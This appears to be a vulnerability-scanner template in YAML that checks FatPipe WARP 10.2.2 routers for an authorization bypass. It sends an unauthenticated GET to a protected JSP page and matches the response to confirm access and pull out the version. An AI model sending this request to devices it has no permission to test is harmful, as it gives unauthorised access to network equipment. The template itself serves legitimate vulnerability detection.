id: fatpipe-auth-bypass
info:
  author: gy741
  description: Improper access control occurs when the application provides direct
    access to objects based on user-supplied input. As a result of this vulnerability
    attackers can bypass authorization and access resources behind protected pages.
  name: FatPipe Networks WARP 10.2.2 Authorization Bypass
  reference:
  - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5682.php
  - https://www.fatpipeinc.com/support/advisories.php
  severity: high
  tags: fatpipe,auth-bypass,router
requests:
- extractors:
  - part: body
    regex:
    - 'version: "([0-9.a-z]+)"'
    type: regex
  matchers:
  - status:
    - 200
    type: status
  - condition: and
    type: word
    words:
    - productType
    - 'type:'
    - 'version:'
    - <title>FatPipe Networks</title>
  matchers-condition: and
  raw:
  - 'GET /fpui/jsp/index.jsp HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    '
